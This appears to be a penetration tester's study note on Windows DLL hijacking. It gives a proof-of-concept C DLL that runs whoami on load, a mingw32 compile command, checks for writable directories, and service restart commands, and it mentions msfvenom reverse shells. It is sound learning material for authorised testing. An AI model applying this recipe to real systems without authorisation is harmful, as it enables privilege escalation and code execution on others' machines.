# DLL Hijacking
##### **Introduction**
This is when we replace a legitimate DLL with a malicious one, perhaps created using msfvenon to get us a reverse shell, or a user.

##### **Finding DLL vulnerabilities**
Install the target application on a test system and run ProcMon [https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to view DLLs loaded. ProcMon has to be run as Administrator. 

##### **Create a DLL replacement**
1. We need to generate our own valid DLL to replace the existing, genuine one. A skeleton DLL code that outputs the result of `whoami` to `C:\Temp\dll.txt`.

	```
	#include <windows.h> 
	
	BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { 
	
		if (dwReason == DLL_PROCESS_ATTACH) { 
			system("cmd.exe /k whoami > C:\\Temp\\dll.txt"); 
			ExitProcess(0); 
		}
		 
		return TRUE; 
	}
	```

2. Then we can compile it using mingw32. 

	```
	x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
	```


##### **Check if a directory is writeable**
We need to find a directory that the vulnerable service or executable will be able to find our malicious DLL. We can use the commands below to check we have write access. These can also be used for [Unquoted Service Paths](obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FUnquoted%20Service%20Path%2FUnquoted%20Service%20Path)

*[icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)*
```
icacls FOLDER/FILE NAME 
```

*[accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)* 
```
accesschk.exe /uwdq "PATH TO CHECK"
```

*- u - Suppress errors.*
*- w- Show only writable* 
*- d - Check only directories*
*- q- Omit banner*

##### **Start/stop service** 
Below are various ways to restart a service so that the new DLL gets executed. 
```
Stop-Service -Name SERVICE_NAME
Start-Service -Name SERVICE_NAME

sc start SERVICE_NAME
sc stop SERVICE_NAME

sc queryex SERVICE_NAME # checks service status
sc qc SERVICE_NAME # shows what user is running that service
```